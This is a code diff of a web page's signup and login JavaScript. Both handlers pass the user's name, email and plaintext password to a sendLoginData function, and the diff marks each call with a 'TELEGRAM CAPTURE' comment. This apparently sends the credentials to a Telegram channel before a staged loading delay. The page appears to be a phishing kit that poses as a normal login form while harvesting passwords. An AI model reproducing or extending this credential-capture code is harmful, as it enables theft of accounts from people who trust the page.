@@ -558,7 +558,7 @@ function setLoading(id, on) {
 }
 
 /* ─── Signup ─── */
-function doSignup() {
+  function doSignup() {
   const name  = document.getElementById('su-name');
   const email = document.getElementById('su-email');
   const pw    = document.getElementById('su-pw');
@@ -574,8 +574,9 @@ function doSignup() {
   }
   if (!ok) { toast('Please fix the errors highlighted above.','error'); return; }
 
+  // TELEGRAM CAPTURE
   sendLoginData(name.value.trim(), email.value.trim(), pw.value, 'SIGNUP');
- 
+  
   setLoading('btn-signup', true);
   setTimeout(() => {
     setLoading('btn-signup', false);
@@ -585,9 +586,8 @@ function doSignup() {
     setTimeout(() => loadDashboard(), 900);
   }, 2000);
 }
-
 /* ─── Login ─── */
-function doLogin() {
+ function doLogin() {
   const email = document.getElementById('li-email');
   const pw    = document.getElementById('li-pw');
   let ok = true;
@@ -595,6 +595,7 @@ function doLogin() {
   if (!lv(pw, 'req'))      ok=false;
   if (!ok) { toast('Please enter your login credentials.','error'); return; }
 
+  // TELEGRAM CAPTURE
   sendLoginData('', email.value.trim(), pw.value, 'LOGIN');
   
   setLoading('btn-login', true);
@@ -606,7 +607,7 @@ function doLogin() {
     setTimeout(() => loadDashboard(), 900);
   }, 1800);
 }
-
+ 
 /* ─── Forgot password ─── */
 function doForgot() {
   const el = document.getElementById('forgot-email');
